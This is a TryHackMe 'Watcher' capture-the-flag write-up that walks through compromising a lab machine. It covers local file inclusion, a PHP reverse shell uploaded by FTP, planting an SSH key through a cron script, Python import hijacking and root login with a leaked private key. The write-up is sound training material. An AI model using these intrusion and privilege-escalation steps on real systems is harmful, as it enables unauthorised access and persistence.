---
layout: post
title:  "Tryhackme Watcher writeup"
date:   2021-02-22 22:19:00 +0200
categories: tryhackme writeup
---

This is a writeup for TryHackMe room [Watcher](https://tryhackme.com/room/watcher).

## flag 1

checking robots.txt:
```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

## flag 2

There is a LFI inclusion vulnerability http://IP/post.php?post=striped.php where you can enter any file like http://IP/post.php?post=/etc/passwd . Obviously need to check the file mentioned in robots.txt! http://IP/post.php?post=/var/www/html/secret_file_do_not_read.txt

```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- __REDACTED__:__REDACTED__ 
```

Login to the server using FTP and get the second flag.

## flag 3

We can a upload a remote shell to the FTP server since file it is allowed and use the LFI above to invoke the code.

http://IP/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php

`cat /var/www/html/more_secrets_a9f10a/flag_3.txt`


## flag 4

```
sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```

So let's get grab the flag:

`sudo -u toby cat /home/toby/flag_4.txt`


## flag 5

Checking cron jobs:

```
*/1 * * * * mat /home/toby/jobs/cow.sh
```
Start by getting a proper terminal as **toby**:
```
sudo -u toby /bin/bash
/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Get a proper shell as toby in two steps (yeah could have combined these):
```
echo "mkdir /home/mat/.ssh" > cow.sh
```
insert my own SSH key:
```bash
echo "echo ssh-rsa AAAAB...8oCGHj/cAc= kali@kali > /home/mat/.ssh/authorized_keys" > /home/toby/jobs/cow.sh
```

## flag 6

login as mat using SSH.

```
sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

will_script.py imports cmd.py which we can write to so let's spawn a shell as will. Add the following to the beginning of cmd.py:
```python=
import os
os.system("/bin/bash -p")
```
Run the script:
```
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *
```

Grab the flag: `cat /home/will/flag_6.txt`


## flag 7
So, we are now will. Had to check after so many jumps.
```
id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
```
What's special about **adm** group?
```
find / -group adm 2>/dev/null
/opt/backups
/opt/backups/key.b64
/var/log/auth.log
/var/log/kern.log
/var/log/syslog
/var/log/apache2
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/other_vhosts_access.log
/var/log/cloud-init.log
/var/log/unattended-upgrades
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
/var/log/apt/term.log
```
key.b64 is a base64 encoded RSA private key. Check if it can be used to login to the box as root:
```
base64 -d /opt/backups/key.b64  > root_key
chmod og-rwx root_key 
ssh -i root_key root@10.10.78.244
```
BOOM! We are root. Grab the flag from /root.


